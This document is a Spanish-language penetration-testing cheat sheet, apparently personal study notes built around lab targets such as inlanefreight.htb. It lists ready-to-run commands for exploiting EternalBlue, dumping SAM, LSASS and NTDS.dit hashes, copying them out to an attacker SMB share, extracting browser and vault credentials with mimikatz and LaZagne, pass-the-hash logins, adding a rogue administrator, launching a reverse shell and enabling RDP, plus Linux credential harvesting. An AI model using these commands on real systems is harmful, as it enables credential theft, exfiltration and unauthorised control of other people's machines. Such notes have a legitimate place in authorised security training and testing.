# Sistemas Operativos

## Windows

### Metasploit

Explotación de vulnerabilidad eternalblue.

```bash
msfconsole
```

```bash
use exploit/windows/smb/ms17_010_psexec
```

Explotación de vulnerabilidad eternalblue variante.

```bash
msfconsole
```

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

### Dump Password

Guardar copias de seguridad de archivos

```powershell
reg.exe save hklm\sam C:\sam.save
```

```powershell
reg.exe save hklm\system C:\system.save
```

```powershell
reg.exe save hklm\security C:\security.save
```

Crear servidor  samba para exfiltrar información

{% code overflow="wrap" %}
```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support <nombre.recurso> /home/<user>/<carpeta>/
```
{% endcode %}

Mover las copias al servidor

```powershell
move <file>.save \\10.10.10.10\<nombre.recurso>
```

Volcado de hash

{% code overflow="wrap" %}
```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam <sam.file> -security <security.file> -system <system.file> LOCAL
```
{% endcode %}

#### Extración de credenciales sam de usuario mediante servicios

```bash
netexec smb 10.10.10.10 --local-auth -u <user> -p <password> --sam
```

#### Extración de credenciales lsa de usuario mediante servicios

```bash
netexec smb 10.10.10.10 --local-auth -u <user> -p <password> --lsa
```

### Dump Password LSASS

Obtener id proceso lsass

```powershell
Get-Process lsass
```

Obtener dump del proceso

```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <id.process> C:\lsass.dmp full
```

Enviar archivo a máquina atacante mediante exfiltración

Obtener información decoficada

```bash
pypykatz lsa minidump lsass.dmp
```

Crackear hash NTLM con hashcat

```bash
hashcat -m 1000 <hash.ntlm> --wordlist <file.diccionario>
```

### Windows Vault

Extraer copia de seguridad de vault

```powershell
rundll32 keymgr.dll,KRShowKeyMgr
```

Enumerar credenciales del usuario

```powershell
cmdkey /list
```

Suplanatar usuario de dominio

```powershell
runas /savecred /user:<dominio>\<user> cmd
```

#### Mimikatz

Ataque al administrador de contraseñas de windows

```powershell
mimikatz.exe
```

```powershell
privilege::debug
```

```
sekurlsa::credman
```

Lazagne

Descargar ejecutable

```powershell
https://github.com/AlessandroZ/LaZagne
```

Ejecutar el software

```powershell
LaZagne.exe
```

### Dump Password NTDS

Metodo recortado

```bash
netexec smb 10.10.10.10 -u <user> -p '<password>' -M ntdsutil
```

#### Extracción de hash AD

Conectarse a un controlador de dominio DC

```bash
evil-winrm -i 10.10.10.10  -u <user> -p '<password>'
```

Revisar permisos del grupo asociado a la cuenta

```powershell
net localgroup
```

Revisar permisos del usuario, debe ser domain admin

```powershell
net user bwilliamson
```

Generar instantanea del volumen c:

```powershell
vssadmin CREATE SHADOW /For=C:
```

Copiar NTDS.dit

{% code overflow="wrap" %}
```
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
{% endcode %}

Exfiltrar información mediante smb

{% code overflow="wrap" %}
```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support <nombre.recurso> /home/<user>/<carpeta>/
```
{% endcode %}

Mover las copias al servidor

```powershell
move <file>.save \\10.10.10.10\<nombre.recurso>
```

Extracciones de hash NTDS

```bash
impacket-secretsdump -ntds <NTDS.dit> -system SYSTEM LOCAL
```

Descifrar hash descubiertos

```bash
sudo hashcat -m 1000 <hash> <diccionario>
```

### Dump Password Browser

#### Extración de credenciales de usuario navegador web

```
C:\Users\Public> mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
> Encrypted Key found in local state file
> Encrypted Key seems to be protected by DPAPI
 * using CryptUnprotectData API
> AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c

URL     : http://10.10.14.94/ ( http://10.10.14.94/login.html )
Username: bob
 * using BCrypt with AES-256-GCM
Password: April2025!

#Program - DonPAPI
```

### Pass The Hahs

#### Autenticación en host final

Autenticación mediante hash con evil-winrm

```bash
evil-winrm -i 10.10.10.10 -u <usuario> -H <hash>
```

#### Ejecución de proceso

Evaluación de apertura de procesos

{% code overflow="wrap" %}
```powershell
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
{% endcode %}

Ejecución del proceso

{% code overflow="wrap" %}
```powershell
sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe
```
{% endcode %}

### Creación de usuario con privilegios

Ejecutar comando remoto

```powershell
cd C:\tools\Invoke-TheHash\
```

Importar modulo

```powershell
Import-Module .\Invoke-TheHash.psd1
```

Crear usuario

{% code overflow="wrap" %}
```powershell
Invoke-SMBExec -Target 10.10.10.10 -Domain <dominio.local> -Username <usuario> -Hash <hash> -Command "net user <usuario> <password> /add && net localgroup administrators <usuario> /add" -Verbose
```
{% endcode %}

### Obtener reverse shell

Poner en escucha

```powershell
nc -nlvp 9001
```

Lanzar shell remota

{% code overflow="wrap" %}
```
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e <reverse.shell.code>"
```
{% endcode %}

### Activar RDP

Autenticación mediante hash con evil-winrm

```bash
evil-winrm -i 10.10.10.10 -u <usuario> -H <hash>
```

Activar registro para permitir conexiones RDP

{% code overflow="wrap" %}
```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
{% endcode %}

Conectarse al RDP

```powershell
xfreerdp  /v:10.10.10.10 /u:<usuario> /pth:<hash>
```

## Linux

### Credenciales en Memoria

Descargar el software

```bash
git clone https://github.com/huntergregal/mimipenguin.git
```

Ejecutar software

```bash
./mimipenguin.sh
```

### Credenciales Almacenadas

Descargar el software

```bash
git clone https://github.com/AlessandroZ/LaZagne.git
```

Preparar entorno virtual python

```bash
python3 -m venv venv
```

```bash
source venv/bin/activate
```

Descargar requerimientos

```bash
pip3 install -r requirements.txt
```

Ejecutar software

```bash
python3 laZagne.py all
```

### Credenciales en Navegadores

Firefox

```bash
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

Desencriptar credenciales firefox

```bash
python3.9 firefox_decrypt.py
```

Desencriptar credenciales en navegador usando lazagne

```bash
python3 laZagne.py browsers
```

### Historial de Comandos

```bash
tail -n5 /home/*/.bash*
```

### Encontrar conexiones

{% code overflow="wrap" %}
```bash
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```
{% endcode %}
